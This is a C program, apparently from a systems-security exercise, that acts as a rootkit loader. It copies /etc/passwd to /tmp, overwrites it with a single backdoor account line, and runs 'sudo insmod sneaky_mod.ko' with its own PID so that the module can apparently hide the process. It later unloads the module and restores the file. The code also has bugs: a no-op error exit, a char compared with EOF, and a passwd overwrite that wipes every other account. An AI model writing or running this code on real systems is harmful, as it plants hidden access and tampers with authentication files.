#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void copyFile(char * srcFilename, char * destFilename) {
  FILE * srcFile = fopen(srcFilename, "r");
  if (srcFile == NULL) {
    printf("Failed to open file %s \n", srcFilename);
    return;
  }
  FILE * destFile = fopen(destFilename, "w");
  if (destFile == NULL) {
    printf("Failed to open file %s \n", destFilename);
    return;
  }
  char c;
  while ((c = fgetc(srcFile)) != EOF) {
    fputc(c, destFile);
  }
  fclose(srcFile);
  fclose(destFile);
}

void writeFile(const char * filename, const char * toWrite) {
  FILE * f = fopen(filename, "w");
  if (f == NULL) {
    printf("Failed to open file %s \n", filename);
    EXIT_FAILURE;
  }
  fprintf(f, "%s", toWrite);
  fclose(f);
}

int main() {
  printf("sneaky_process pid = %d\n", getpid());
  copyFile("/etc/passwd", "/tmp/passwd");
  writeFile("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  char arg[64];
  sprintf(arg, "sudo insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
  system(arg);

  char c;
  while ((c = getchar()) != 'q') {
  }

  system("sudo rmmod sneaky_mod.ko");
  copyFile("/tmp/passwd", "/etc/passwd");
  system("rm /tmp/passwd"); 
  
  return EXIT_SUCCESS;
}